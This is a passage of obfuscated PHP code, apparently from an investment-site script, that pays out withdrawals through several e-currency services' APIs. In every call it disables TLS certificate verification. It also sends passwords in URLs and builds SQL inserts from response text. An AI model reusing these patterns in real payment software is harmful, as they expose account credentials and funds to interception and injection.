      curl_setopt ($elnlcTQnW, CURLOPT_POSTFIELDS, 'AccountID=' . rawurlencode ($elnlcpvEj[$elnlcMVquv['elnlcEqCrV']]) . '&PassPhrase=' . rawurlencode ($elnlcMEQmq) . '&Payee_Account=' . rawurlencode ($elnlcpGcN) . '&Amount=' . rawurlencode ($elnlcusGj) . '&PAY_IN=' . rawurlencode ($elnlcpvEj[$elnlcMVquv['elnlcBwBAt']]) . ('' . '&WORTH_OF=Gold&Memo=' . $elnlcSFSSt . '&IGNORE_RATE_CHANGE=y'));
      curl_setopt ($elnlcTQnW, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcTQnW, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcTQnW);
      curl_close ($elnlcTQnW);
      $elnlcwpyy = array ();
      if (preg_match ('/<input type=hidden name=PAYMENT_BATCH_NUM VALUE="(\\d+)">/ims', $a, $elnlcwpyy))
      {
        return array (1, '', $elnlcwpyy[1]);
      }
      else
      {
        if (preg_match ('/<input type=hidden name=ERROR VALUE="(.*?)">/ims', $a, $elnlcwpyy))
        {
          $elnlcexQhV = preg_replace ('/&lt;/i', '<', $elnlcwpyy[1]);
          $elnlcexQhV = preg_replace ('/&gt;/i', '>', $elnlcexQhV);
          $e = elnlckjnjt ('' . $elnlcvubh . ' ' . $elnlcexQhV);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcvubh . ('' . ' ' . $elnlcexQhV), '');
        }
        else
        {
          $e = elnlckjnjt ('' . $elnlcvubh . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcvubh . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlckjnjt ('' . $elnlcvubh . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcvubh . ' Curl functions are not available');
    }

  }

  function elnlcrogcc ($elnlcgodh, $elnlcusGj, $elnlcpGcN, $elnlcSFSSt, $elnlcvubh)
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    if ($elnlcpvEj[$elnlcMVquv['elnlcEPxH']] == $elnlcMVquv['elnlcvPEr'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcpvEj[$elnlcMVquv['elnlczzIb']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcpGcN == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to AlertPay account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid AlertPay account', '');
    }

    list ($elnlcvmju, $elnlcSsmhm) = elnlcoaka ($elnlcpGcN, 11);
    if ($elnlcvmju == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcSsmhm . '\'';
      mysql_query ($q);
      return array (0, $elnlcSsmhm);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcgodh == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'alertpay_account_password\'';
        $elnlcOsDxl = mysql_query ($q);
        while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
        {
          $elnlcgSSnH = elnlcdxpe ($elnlcweaeO[$elnlcMVquv['elnlcCCsn']], $elnlcMVquv['elnlcQlDcy']);
        }
      }
      else
      {
        $elnlcgSSnH = $elnlcgodh;
      }

      $elnlcTQnW = curl_init ();
      $elnlcSFSSt = rawurlencode ($elnlcSFSSt);
      $elnlcVtfRt = sprintf ('USER=%s&PASSWORD=%s&AMOUNT=%s&CURRENCY=%s&RECEIVEREMAIL=%s&SENDEREMAIL=%s&PURCHASETYPE=%s&NOTE=%s&TESTMODE=%s', urlencode ($elnlcpvEj[$elnlcMVquv['elnlcOJrbm']]), urlencode ($elnlcgSSnH), urlencode ($elnlcusGj), 'USD', urlencode ($elnlcpGcN), '', 0, urlencode ($elnlcSFSSt), 0);
      curl_setopt ($elnlcTQnW, CURLOPT_URL, $elnlcMVquv['elnlcWujur']);
      curl_setopt ($elnlcTQnW, CURLOPT_POST, true);
      curl_setopt ($elnlcTQnW, CURLOPT_POSTFIELDS, $elnlcVtfRt);
      curl_setopt ($elnlcTQnW, CURLOPT_RETURNTRANSFER, true);
      curl_setopt ($elnlcTQnW, CURLOPT_HEADER, false);
      curl_setopt ($elnlcTQnW, CURLOPT_TIMEOUT, 30);
      curl_setopt ($elnlcTQnW, CURLOPT_SSL_VERIFYPEER, false);
      $a = curl_exec ($elnlcTQnW);
      curl_close ($elnlcTQnW);
      parse_str (urldecode ($a), $elnlcDDzdV);
      $elnlcwpyy = array ();
      if ($elnlcDDzdV[$elnlcMVquv['elnlckddJ']] == 100)
      {
        return array (1, '', $elnlcDDzdV[$elnlcMVquv['elnlcJVbW']]);
      }
      else
      {
        if (200 < $elnlcDDzdV[$elnlcMVquv['elnlckddJ']])
        {
          $elnlcexQhV = $elnlcDDzdV[$elnlcMVquv['elnlckddJ']] . ': ' . $elnlcDDzdV[$elnlcMVquv['elnlcAeGi']];
          $e = elnlckjnjt ('' . $elnlcvubh . ' ' . $elnlcexQhV);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcvubh . ('' . ' ' . $elnlcexQhV), '');
        }
        else
        {
          $e = elnlckjnjt ('' . $elnlcvubh . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcvubh . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlckjnjt ('' . $elnlcvubh . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcvubh . ' Curl functions are not available');
    }

  }

  function elnlcdtbl ($elnlcgodh, $elnlcusGj, $elnlcpGcN, $elnlcSFSSt, $elnlcvubh)
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    $elnlcusGj = sprintf ('%0.2f', floor ($elnlcusGj * 100) / 100);
    if ($elnlcpvEj[$elnlcMVquv['elnlczzIb']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcpGcN == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can not process withdrawal to Evocash account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid EvoCash account', '');
    }

    list ($elnlcvmju, $elnlcSsmhm) = elnlcoaka ($elnlcpGcN, 1);
    if ($elnlcvmju == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcSsmhm . '\'';
      mysql_query ($q);
      return array (0, $elnlcSsmhm);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcgodh == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'evocash_account_password\'';
        $elnlcOsDxl = mysql_query ($q);
        while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
        {
          $elnlcxlDA = elnlcdxpe ($elnlcweaeO[$elnlcMVquv['elnlcCCsn']], $elnlcMVquv['elnlcQlDcy']);
        }

        $q = 'select v from hm2_pay_settings where n=\'evocash_transaction_code\'';
        $elnlcOsDxl = mysql_query ($q);
        while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
        {
          $elnlcBykB = elnlcdxpe ($elnlcweaeO[$elnlcMVquv['elnlcCCsn']], $elnlcMVquv['elnlcQlDcy']);
        }
      }
      else
      {
        list ($elnlcxlDA, $elnlcBykB) = preg_split ('/\\|/', $elnlcgodh);
      }

      $elnlcTQnW = curl_init ();
      $elnlcSFSSt = rawurlencode ($elnlcSFSSt);
      curl_setopt ($elnlcTQnW, CURLOPT_URL, 'https://www.evocash.com/evoswift/instantpayment.cfm?payingaccountid=' . rawurlencode ($elnlcpvEj[$elnlcMVquv['elnlcMtfm']]) . '&username=' . rawurlencode ($elnlcpvEj[$elnlcMVquv['elnlcohds']]) . '&password=' . rawurlencode ($elnlcxlDA) . '&transaction_code=' . rawurlencode ($elnlcBykB) . '&amount=' . rawurlencode ($elnlcusGj) . ('' . '&reference=&memo=' . $elnlcSFSSt . '&receivingaccountid=') . rawurlencode ($elnlcpGcN) . '');
      curl_setopt ($elnlcTQnW, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcTQnW, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcTQnW);
      curl_close ($elnlcTQnW);
      $elnlcwpyy = array ();
      if (preg_match ('/<INPUT TYPE="Hidden" NAME="PayingTransactionID" VALUE="(.*?)">/ims', $a, $elnlcwpyy))
      {
        return array (1, '', $elnlcwpyy[1]);
      }
      else
      {
        if (preg_match ('/<INPUT TYPE="Hidden" NAME="Error" VALUE="(.*?)">/ims', $a, $elnlcwpyy))
        {
          $elnlcexQhV = $elnlcwpyy[1];
          $e = elnlckjnjt ('' . $elnlcvubh . ' ' . $elnlcexQhV);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcvubh . ('' . ' ' . $elnlcexQhV), '');
        }
        else
        {
          $e = elnlckjnjt ('' . $elnlcvubh . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcvubh . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlckjnjt ('' . $elnlcvubh . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcvubh . ' Curl functions are not available');
    }

  }

  function elnlcpgcws ($elnlcgodh, $elnlcusGj, $elnlcpGcN, $elnlcSFSSt, $elnlcvubh)
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    if ($elnlcpvEj[$elnlcMVquv['elnlcEPxH']] == $elnlcMVquv['elnlcvPEr'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcpvEj[$elnlcMVquv['elnlczzIb']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcpGcN == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to IntGold account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid IntGold account', '');
    }

    list ($elnlcvmju, $elnlcSsmhm) = elnlcoaka ($elnlcpGcN, 2);
    if ($elnlcvmju == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcSsmhm . '\'';
      mysql_query ($q);
      return array (0, $elnlcSsmhm);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcgodh == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'intgold_password\'';
        $elnlcOsDxl = mysql_query ($q);
        while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
        {
          $elnlchhNQk = elnlcdxpe ($elnlcweaeO[$elnlcMVquv['elnlcCCsn']], $elnlcMVquv['elnlcQlDcy']);
        }
      }
      else
      {
        $elnlchhNQk = $elnlcgodh;
      }

      if ($elnlcgodh == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'intgold_password\'';
        $elnlcOsDxl = mysql_query ($q);
        while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
        {
          $elnlchhNQk = elnlcdxpe ($elnlcweaeO[$elnlcMVquv['elnlcCCsn']], $elnlcMVquv['elnlcQlDcy']);
        }

        $q = 'select v from hm2_pay_settings where n=\'intgold_transaction_code\'';
        $elnlcOsDxl = mysql_query ($q);
        while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
        {
          $elnlcmMkq = elnlcdxpe ($elnlcweaeO[$elnlcMVquv['elnlcCCsn']], $elnlcMVquv['elnlcQlDcy']);
        }
      }
      else
      {
        list ($elnlchhNQk, $elnlcmMkq) = preg_split ('/\\|/', $elnlcgodh);
      }

      $elnlcTQnW = curl_init ();
      $elnlcSFSSt = rawurlencode ($elnlcSFSSt);
      curl_setopt ($elnlcTQnW, CURLOPT_URL, 'https://intgold.com/cgi-bin/autopay.cgi');
      curl_setopt ($elnlcTQnW, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcTQnW, CURLOPT_POST, 1);
      curl_setopt ($elnlcTQnW, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)');
      curl_setopt ($elnlcTQnW, CURLOPT_POSTFIELDS, 'ACCOUNTID=' . rawurlencode ($elnlcpvEj[$elnlcMVquv['elnlcCcMMw']]) . '&PASSWORD=' . rawurlencode ($elnlchhNQk) . '&SECPASSWORD=' . rawurlencode ($elnlcmMkq) . '&RECEIVER=' . rawurlencode ($elnlcpGcN) . '&AMOUNT=' . rawurlencode ($elnlcusGj) . '&NOTE=' . $elnlcSFSSt);
      curl_setopt ($elnlcTQnW, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt ($elnlcTQnW, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcTQnW);
      curl_close ($elnlcTQnW);
      $elnlcwpyy = array ();
      if (preg_match ('' . '/Success\\s*TRANSACTION_ID:(.*?)$/ims', $a, $elnlcwpyy))
      {
        return array (1, '', $elnlcwpyy[1]);
      }
      else
      {
        $e = elnlckjnjt ('' . $elnlcvubh . ' ' . $a);
        $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
        mysql_query ($q);
        return array (0, $elnlcvubh . ('' . ' ' . $a), '');
      }
    }
    else
    {
      $e = elnlckjnjt ('' . $elnlcvubh . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcvubh . ' Curl functions are not available');
    }

  }

  function elnlcktavs ($elnlcgodh, $elnlcusGj, $elnlcpGcN, $elnlcSFSSt, $elnlcvubh)
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    if ($elnlcpvEj[$elnlcMVquv['elnlcEPxH']] == $elnlcMVquv['elnlcvPEr'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcpvEj[$elnlcMVquv['elnlczzIb']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcpGcN == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to eeeCureency account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid eeeCurrency account', '');
    }

    list ($elnlcvmju, $elnlcSsmhm) = elnlcoaka ($elnlcpGcN, 8);
    if ($elnlcvmju == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcSsmhm . '\'';
      mysql_query ($q);
      return array (0, $elnlcSsmhm);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcgodh == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'eeecurrency_password\'';
        $elnlcOsDxl = mysql_query ($q);
        while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
        {
          $elnlcqdRQ = elnlcdxpe ($elnlcweaeO[$elnlcMVquv['elnlcCCsn']], $elnlcMVquv['elnlcQlDcy']);
        }

        $q = 'select v from hm2_pay_settings where n=\'eeecurrency_transaction_code\'';
        $elnlcOsDxl = mysql_query ($q);
        while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
        {
          $elnlcfwutD = elnlcdxpe ($elnlcweaeO[$elnlcMVquv['elnlcCCsn']], $elnlcMVquv['elnlcQlDcy']);
        }
      }
      else
      {
        list ($elnlcqdRQ, $elnlcfwutD) = preg_split ('/\\|/', $elnlcgodh);
      }

      $elnlcTQnW = curl_init ();
      $elnlcSFSSt = rawurlencode ($elnlcSFSSt);
      curl_setopt ($elnlcTQnW, CURLOPT_URL, 'https://eeecurrency.com/cgi-bin/autopay.cgi');
      curl_setopt ($elnlcTQnW, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcTQnW, CURLOPT_POST, 1);
      curl_setopt ($elnlcTQnW, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)');
      curl_setopt ($elnlcTQnW, CURLOPT_POSTFIELDS, 'ACCOUNTID=' . rawurlencode ($elnlcpvEj[$elnlcMVquv['elnlcsLBWF']]) . '&PASSWORD=' . rawurlencode ($elnlcqdRQ) . '&SECPASSWORD=' . rawurlencode ($elnlcfwutD) . '&RECEIVER=' . rawurlencode ($elnlcpGcN) . '&AMOUNT=' . rawurlencode ($elnlcusGj) . ('' . '&NOTE=' . $elnlcSFSSt));
      curl_setopt ($elnlcTQnW, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcTQnW);
      curl_close ($elnlcTQnW);
      $elnlcwpyy = array ();
      if (preg_match ('' . '/Success\\s*TRANSACTION_ID:(.*?)$/ims', $a, $elnlcwpyy))
      {
        return array (1, '', $elnlcwpyy[1]);
      }
      else
      {
        $e = elnlckjnjt ('' . $elnlcvubh . ' ' . $a);
        $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
        mysql_query ($q);
        return array (0, $elnlcvubh . ('' . ' ' . $a), '');
      }
    }
    else
    {
      $e = elnlckjnjt ('' . $elnlcvubh . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcvubh . ' Curl functions are not available');
    }

  }

  function elnlcfjvm ($elnlcgodh, $elnlcusGj, $elnlcpGcN, $elnlcSFSSt, $elnlcvubh)
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    if ($elnlcpvEj[$elnlcMVquv['elnlcEPxH']] == $elnlcMVquv['elnlcvPEr'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcpvEj[$elnlcMVquv['elnlczzIb']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcpGcN == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty Pecunix account.\'';
      mysql_query ($q);
      return array (0, 'Invalid Pecunix account', '');
    }

    list ($elnlcvmju, $elnlcSsmhm) = elnlcoaka ($elnlcpGcN, 9);
    if ($elnlcvmju == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcSsmhm . '\'';
      mysql_query ($q);
      return array (0, $elnlcSsmhm);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcgodh == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'pecunix_password\'';
        $elnlcOsDxl = mysql_query ($q);
        while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
        {
          $elnlcwMKax = elnlcdxpe ($elnlcweaeO[$elnlcMVquv['elnlcCCsn']], $elnlcMVquv['elnlcQlDcy']);
        }
      }
      else
      {
        $elnlcwMKax = $elnlcgodh;
      }

      $elnlcTQnW = curl_init ();
      $elnlceLHib = elnlcneuth ('{px_time}');
      $elnlcWELI = strtoupper (md5 ($elnlcwMKax . ':' . $elnlceLHib));
      $elnlcVtfRt = '
    <TransferRequest>
      <Transfer>
        <TransferId> </TransferId>
        <Payer> ' . htmlentities ($elnlcpvEj[$elnlcMVquv['elnlcEJqJG']], ENT_NOQUOTES) . ' </Payer>
        <Payee> ' . htmlentities ($elnlcpGcN, ENT_NOQUOTES) . ' </Payee>
        <CurrencyId> GAU </CurrencyId>
        <Equivalent>
          <CurrencyId> USD </CurrencyId>
          <Amount> ' . htmlentities ($elnlcusGj, ENT_NOQUOTES) . ' </Amount>
        </Equivalent>
        <FeePaidBy> Payee </FeePaidBy>
        <Memo> ' . htmlentities ($elnlcSFSSt, ENT_NOQUOTES) . ('' . ' </Memo>
      </Transfer>
      <Auth>
        <Token> ' . $elnlcWELI . ' </Token>
      </Auth>
    </TransferRequest>
    ');
      $elnlcTQnW = curl_init ();
      curl_setopt ($elnlcTQnW, CURLOPT_URL, 'https://pxi.pecunix.com/money.refined...transfer');
      curl_setopt ($elnlcTQnW, CURLOPT_POST, 1);
      curl_setopt ($elnlcTQnW, CURLOPT_POSTFIELDS, $elnlcVtfRt);
      curl_setopt ($elnlcTQnW, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcTQnW, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcTQnW);
      curl_close ($elnlcTQnW);
      $elnlcGryvK = elnlcsnag ($a);
      if ($elnlcGryvK[$elnlcMVquv['elnlcxBlW']] == $elnlcMVquv['elnlcJmVy'])
      {
        return array (1, '', $elnlcGryvK[$elnlcMVquv['elnlcNvcv']]);
      }
      else
      {
        if ($elnlcGryvK[$elnlcMVquv['elnlcxBlW']] == $elnlcMVquv['elnlcNEvp'])
        {
          $e = elnlckjnjt ('' . $elnlcvubh . ' ' . $elnlcGryvK[$elnlcMVquv['elnlcukssk']] . ' ' . $elnlcGryvK[$elnlcMVquv['elnlcuNqG']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlckjnjt ('' . $elnlcvubh . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlckjnjt ('' . $elnlcvubh . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcvubh . ' Curl functions are not available');
    }

  }

  function elnlcclrc ($elnlcgodh, $elnlcusGj, $elnlcpGcN, $elnlcSFSSt, $elnlcvubh)
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    if ($elnlcpvEj[$elnlcMVquv['elnlcEPxH']] == $elnlcMVquv['elnlcvPEr'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcpvEj[$elnlcMVquv['elnlczzIb']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcpGcN == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty LibertyReserve account.\'';
      mysql_query ($q);
      return array (0, 'Invalid LibertyReserve account', '');
    }

    list ($elnlcvmju, $elnlcSsmhm) = elnlcoaka ($elnlcpGcN, 15);
    if ($elnlcvmju == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcSsmhm . '\'';
      mysql_query ($q);
      return array (0, $elnlcSsmhm);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcgodh == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'libertyreserve_password\'';
        $elnlcOsDxl = mysql_query ($q);
        while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
        {
          $elnlcrBblF = elnlcdxpe ($elnlcweaeO[$elnlcMVquv['elnlcCCsn']], $elnlcMVquv['elnlcQlDcy']);
        }

        $elnlcQDEVM = $elnlcpvEj[$elnlcMVquv['elnlcnHWz']];
      }
      else
      {
        list ($elnlcrBblF, $elnlcQDEVM) = preg_split ('/\\|/', $elnlcgodh);
      }

      $elnlcTQnW = curl_init ();
      $elnlcWELI = strtoupper (elnlcneuth ($elnlcrBblF . ':{lr_time}'));
      $elnlcVtfRt = '<TransferRequest id="' . rand (1000000, 9999999) . '">
  <Auth>
    <ApiName>' . htmlspecialchars ($elnlcQDEVM) . ('' . '</ApiName>
    <Token>' . $elnlcWELI . '</Token>
  </Auth>
  <Transfer>
    <TransferType>transfer</TransferType>
    <Payer>') . htmlentities ($elnlcpvEj[$elnlcMVquv['elnlckuuM']], ENT_NOQUOTES) . '</Payer>
    <Payee>' . htmlentities ($elnlcpGcN, ENT_NOQUOTES) . '</Payee>
    <CurrencyId>' . htmlentities ($elnlcpvEj[$elnlcMVquv['elnlcBCSIy']]) . '</CurrencyId>
    <Amount>' . htmlentities ($elnlcusGj, ENT_NOQUOTES) . '</Amount>
    <Memo>' . htmlentities ($elnlcSFSSt, ENT_NOQUOTES) . '</Memo>
    <Anonymous>false</Anonymous>
  </Transfer>
</TransferRequest>';
      $elnlcTQnW = curl_init ();
      curl_setopt ($elnlcTQnW, CURLOPT_URL, 'https://api.libertyreserve.com/xml/transfer.aspx?req=' . urlencode ($elnlcVtfRt));
      curl_setopt ($elnlcTQnW, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcTQnW, CURLOPT_RETURNTRANSFER, 1);
      $elnlcCOgr = array ('User-Agent: Mozilla/5.0');
      curl_setopt ($elnlcTQnW, CURLOPT_HTTPHEADER, $elnlcCOgr);
      $a = curl_exec ($elnlcTQnW);
      curl_close ($elnlcTQnW);
      $elnlcpvEj[$elnlcMVquv['elnlclLvL']] = $elnlcVtfRt;
      $elnlcpvEj[$elnlcMVquv['elnlcpOtk']] = $a;
      $elnlcGryvK = elnlcgvtee ($a);
      if ($elnlcGryvK[$elnlcMVquv['elnlcxBlW']] == $elnlcMVquv['elnlcJmVy'])
      {
        return array (1, '', $elnlcGryvK[$elnlcMVquv['elnlcNvcv']]);
      }
      else
      {
        if ($elnlcGryvK[$elnlcMVquv['elnlcxBlW']] == $elnlcMVquv['elnlcNEvp'])
        {
          $e = elnlckjnjt ('' . $elnlcvubh . ' ' . $elnlcGryvK[$elnlcMVquv['elnlcukssk']] . '<br>' . $elnlcGryvK[$elnlcMVquv['elnlcuNqG']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlckjnjt ('' . $elnlcvubh . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlckjnjt ('' . $elnlcvubh . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcvubh . ' Curl functions are not available');
    }

  }

  function elnlcicrb ($elnlcgodh, $elnlcusGj, $elnlcpGcN, $elnlcSFSSt, $elnlcvubh)
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    if ($elnlcpvEj[$elnlcMVquv['elnlcEPxH']] == $elnlcMVquv['elnlcvPEr'])
    {
    }

    if ($elnlcpvEj[$elnlcMVquv['elnlczzIb']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcpGcN == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty V-Money account.\'';
      mysql_query ($q);
      return array (0, 'Invalid V-Money account', '');
    }

    list ($elnlcvmju, $elnlcSsmhm) = elnlcoaka ($elnlcpGcN, 16);
    if ($elnlcvmju == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcSsmhm . '\'';
      mysql_query ($q);
      return array (0, $elnlcSsmhm);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcgodh == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'vmoney_password\'';
        $elnlcOsDxl = mysql_query ($q);
        while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
        {
          $elnlcedJA = elnlcdxpe ($elnlcweaeO[$elnlcMVquv['elnlcCCsn']], $elnlcMVquv['elnlcQlDcy']);
        }
      }
      else
      {
        $elnlcedJA = $elnlcgodh;
      }

      $elnlcWELI = md5 ($elnlcpvEj[$elnlcMVquv['elnlcyFOyL']] . $elnlcedJA . elnlcneuth ('{vm_time}'));
      $elnlcVtfRt = '<Request>
	<Type>Transfer</Type>
	<Auth>
		<AccountId>' . htmlentities ($elnlcpvEj[$elnlcMVquv['elnlcyFOyL']], ENT_NOQUOTES) . ('' . '</AccountId>
		<Token>' . $elnlcWELI . '</Token>
	</Auth>
	<Transfers>
		<Transfer>
			<ID>1</ID>
			<Payee>') . htmlentities ($elnlcpGcN, ENT_NOQUOTES) . '</Payee>
			<Amount>' . htmlentities ($elnlcusGj, ENT_NOQUOTES) . '</Amount>
			<Memo>' . htmlentities ($elnlcSFSSt, ENT_NOQUOTES) . '</Memo>
		</Transfer>
	</Transfers>
        </Request>';
      $elnlcTQnW = curl_init ();
      curl_setopt ($elnlcTQnW, CURLOPT_URL, 'https://www.v-money.net/vai.php');
      curl_setopt ($elnlcTQnW, CURLOPT_POST, 1);
      curl_setopt ($elnlcTQnW, CURLOPT_POSTFIELDS, 'request_data=' . $elnlcVtfRt);
      curl_setopt ($elnlcTQnW, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcTQnW, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcTQnW);
      curl_close ($elnlcTQnW);
      $elnlcGryvK = elnlcywvbr ($a);
      if ($elnlcGryvK[$elnlcMVquv['elnlcxBlW']] == $elnlcMVquv['elnlcJmVy'])
      {
        return array (1, '', $elnlcGryvK[$elnlcMVquv['elnlcNvcv']]);
      }
      else
      {
        if ($elnlcGryvK[$elnlcMVquv['elnlcxBlW']] == $elnlcMVquv['elnlcNEvp'])
        {
          $e = elnlckjnjt ('' . $elnlcvubh . ' ' . $elnlcGryvK[$elnlcMVquv['elnlcukssk']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
